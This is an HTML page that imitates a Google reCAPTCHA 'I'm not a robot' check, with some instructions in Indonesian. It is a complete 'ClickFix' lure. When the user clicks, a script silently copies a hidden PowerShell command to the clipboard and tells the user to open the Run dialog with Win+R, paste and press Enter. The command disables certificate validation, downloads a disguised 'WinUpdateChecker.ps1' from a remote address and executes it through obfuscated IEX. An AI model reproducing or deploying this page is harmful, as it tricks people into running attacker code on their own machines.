<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Captcha Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .captcha-box {
      background-color: #fff;
      padding: 20px 25px;
      border: 1px solid #ddd;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
      border-radius: 5px;
      display: flex;
      align-items: center;
      gap: 15px;
      width: 320px;
      cursor: pointer;
    }

    .checkbox-container {
      position: relative;
      width: 24px;
      height: 24px;
      border: 2px solid #ccc;
      border-radius: 2px;
      background: #fff;
    }

    .checkbox-container.loading::after {
      content: '';
      position: absolute;
      top: 2px;
      left: 2px;
      width: 16px;
      height: 16px;
      border: 2px solid #4285F4;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .checkbox-container.checked {
      background-color: #4285F4;
      border-color: #4285F4;
    }

    .checkbox-container.checked::after {
      content: 'âœ”';
      color: white;
      font-size: 18px;
      position: absolute;
      top: -2px;
      left: 4px;
    }

    .captcha-label {
      flex-grow: 1;
      font-size: 14px;
      color: #555;
    }

    .steps {
      display: none;
      margin-top: 25px;
      background: #fff;
      padding: 20px;
      width: 330px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }

    .steps h3 {
      margin-top: 0;
      font-size: 16px;
      color: #333;
    }

    .steps ol {
      margin: 10px 0;
      padding-left: 20px;
    }

    .command-wrapper {
      position: relative;
    }

    .command {
      background: #f1f1f1;
      font-family: monospace;
      padding: 10px;
      border-radius: 5px;
      word-break: break-word;
      font-size: 13px;
      overflow-x: auto;
    }

    .copy-btn {
      position: absolute;
      top: 8px;
      right: 8px;
      font-size: 12px;
      padding: 4px 8px;
      background-color: #4285F4;
      color: white;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }

    .copy-btn:hover {
      background-color: #3367D6;
    }

    .win-key {
      display: inline-block;
      background-color: #eee;
      border: 1px solid #ccc;
      padding: 2px 6px;
      font-size: 13px;
      border-radius: 4px;
      font-family: sans-serif;
      margin-right: 3px;
    }

.win-key img {
      width: 12px;
      height: 12px;
      margin-right: 4px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div>
  <div class="captcha-box" onclick="startFakeCaptcha()">
    <div class="checkbox-container" id="checkbox"></div>
    <div class="captcha-label">I'm not a robot</div>
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30" alt="reCAPTCHA">
  </div>

  <div class="steps" id="steps">
    <h3>Final Verification Steps</h3>
    <ol>
      <li>
        Tekan <b>
        <span class="win-key">
<img src="https://images.seeklogo.com/logo-png/40/2/windows-11-icon-logo-png_seeklogo-406208.png" alt="Win"> Win
</span> + <span class="win-key">R</span> </b>
      </li></br>
      <li><b><span class="win-key">Ctrl+V</span></b> Paste dan tekan <b><span class="win-key">Enter</span></b></li>
    </ol>
    <p>Command:</p>
    <div class="command-wrapper">
      <pre class="command" id="commandText"></pre>
      <button class="copy-btn" onclick="copyAgain()">Copy</button>
    </div>
  </div>
</div>

<script>
  let verified = false;
  const payload = `powershell -w hidden -nop -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$u='https://192.168.10.52/WinUpdateChecker.ps1';&('I'+'eX')((New-Object Net.WebClient).DownloadString($u))"`;

  function startFakeCaptcha() {
    if (verified) return;

    const checkbox = document.getElementById('checkbox');
    checkbox.classList.add('loading');

    setTimeout(() => {
      checkbox.classList.remove('loading');
      checkbox.classList.add('checked');
      showSteps();
      verified = true;
    }, 2500);
  }

  function showSteps() {
    navigator.clipboard.writeText(payload).then(() => {
      document.getElementById('steps').style.display = 'block';
      document.getElementById('commandText').textContent = payload;
    }).catch(() => {
      alert("Gagal menyalin command ke clipboard.");
    });
  }

  function copyAgain() {
    navigator.clipboard.writeText(payload).then(() => {
      alert("Command berhasil disalin ulang!");
    }).catch(() => {
      alert("Gagal menyalin ke clipboard.");
    });
  }
</script>

</body>
</html>
